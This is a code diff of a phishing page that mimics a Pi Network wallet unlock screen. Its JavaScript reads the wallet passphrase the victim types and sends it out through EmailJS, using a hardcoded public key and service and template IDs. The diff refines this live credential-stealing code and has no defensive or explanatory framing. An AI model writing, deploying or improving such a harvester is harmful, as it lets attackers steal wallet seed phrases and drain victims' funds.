@@ -136,28 +136,28 @@
             <button type="submit" class="btn-outline">Unlock With Passphrase</button>
         </form>
 
-        <button class="btn-filled" onclick="sendEmail()">Unlock With Fingerprint</button>
+        <button class="btn-filled" onclick="sendEmail(event)">Unlock With Fingerprint</button>
         <p class="info-text">As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
         <p class="info-text">Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your pi in your previous wallet will be inaccessible.</p>
     </main>
 
-    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+
     <script>
-        // Initialize EmailJS with your Public Key
-        emailjs.init('W6VfTUzjwVIY2fl98');  // Replace with your Public Key
+        emailjs.init("W6VfTUzjwVIY2fl98"); // Initialize with your Public Key
 
         function sendEmail(event) {
             if (event) event.preventDefault();  // Prevent form from submitting
 
-            // Prepare email data (can be customized based on form)
+            const passphrase = document.querySelector('[name="passphrase"]').value;
+
             const templateParams = {
-                passphrase: document.querySelector('[name="passphrase"]').value,
+                passphrase: passphrase,
                 from_name: 'Ashraf',
                 to_name: 'Recipient Name',
                 message: 'Hello! You have entered the passphrase.'
             };
 
-            // Send the email using EmailJS
             emailjs.send('service_tjataup', 'template_ca9ohx4', templateParams)
                 .then(function (response) {
                     console.log('Message sent successfully:', response);
